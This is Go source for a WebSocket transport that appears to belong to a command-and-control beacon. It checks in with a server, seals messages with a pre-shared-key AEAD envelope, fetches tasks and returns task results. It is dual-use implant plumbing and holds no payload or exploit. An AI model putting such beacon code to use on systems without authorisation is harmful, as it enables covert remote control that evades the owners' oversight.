package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

// wsChannel speaks AEAD envelopes over WebSocket JSON messages (I2).
// Wire format: client sends sealed envelope (or type-tagged sealed fields);
// prefers same v/n/c envelope as HTTP for process_beacon_checkin compatibility.
type wsChannel struct {
	url string
	psk string
	c   *websocket.Conn
}

func newWSChannel(url, psk string) *wsChannel {
	return &wsChannel{url: url, psk: psk}
}

func (w *wsChannel) connect() error {
	if w.c != nil {
		_ = w.c.Close()
		w.c = nil
	}
	d := websocket.Dialer{
		HandshakeTimeout: 20 * time.Second,
		TLSClientConfig:  &tls.Config{MinVersion: tls.VersionTLS12}, //nolint:gosec // verify on; system roots
	}
	// Always verify TLS - no InsecureSkipVerify
	hdr := http.Header{}
	c, _, err := d.Dial(w.url, hdr)
	if err != nil {
		return err
	}
	w.c = c
	_ = w.c.SetReadDeadline(time.Now().Add(60 * time.Second))
	_ = w.c.SetWriteDeadline(time.Now().Add(30 * time.Second))
	return nil
}

func (w *wsChannel) ensure() error {
	if w.c != nil {
		return nil
	}
	return w.connect()
}

func (w *wsChannel) checkin(payload map[string]any) (map[string]any, error) {
	if err := w.ensure(); err != nil {
		return nil, err
	}
	// Prefer AEAD envelope as the whole message (server process_beacon_checkin)
	env, err := seal(w.psk, payload)
	if err != nil {
		return nil, err
	}
	// Also tag type for older plaintext WS path if server peels type first -
	// sealed envelope has v/alg/n/c keys which process_beacon handles.
	_ = w.c.SetWriteDeadline(time.Now().Add(30 * time.Second))
	if err := w.c.WriteJSON(env); err != nil {
		_ = w.connect()
		if err2 := w.ensure(); err2 != nil {
			return nil, err2
		}
		if err := w.c.WriteJSON(env); err != nil {
			return nil, err
		}
	}
	_ = w.c.SetReadDeadline(time.Now().Add(60 * time.Second))
	_, data, err := w.c.ReadMessage()
	if err != nil {
		w.c = nil
		return nil, err
	}
	var resp map[string]any
	if err := json.Unmarshal(data, &resp); err != nil {
		return nil, err
	}
	// AEAD required - same as HTTP channel (no plaintext task path)
	return openEnv(w.psk, resp)
}

func (w *wsChannel) result(taskID, out, status string) error {
	if err := w.ensure(); err != nil {
		return err
	}
	inner := map[string]any{
		"type":    "result",
		"task_id": taskID,
		"result":  out,
		"status":  status,
	}
	env, err := seal(w.psk, inner)
	if err != nil {
		return err
	}
	_ = w.c.SetWriteDeadline(time.Now().Add(30 * time.Second))
	if err := w.c.WriteJSON(env); err != nil {
		return err
	}
	_ = w.c.SetReadDeadline(time.Now().Add(30 * time.Second))
	_, _, _ = w.c.ReadMessage() // ack
	return nil
}

// dial once helper used in tests
func wsDialOK(ctx context.Context, url string) error {
	d := websocket.Dialer{HandshakeTimeout: 5 * time.Second}
	c, _, err := d.DialContext(ctx, url, nil)
	if err != nil {
		return err
	}
	_ = c.Close()
	return nil
}

func wsResultURLHint(httpURL string) string {
	if strings.Contains(httpURL, "beacon") {
		return fmt.Sprintf("ws derived from %s", httpURL)
	}
	return ""
}
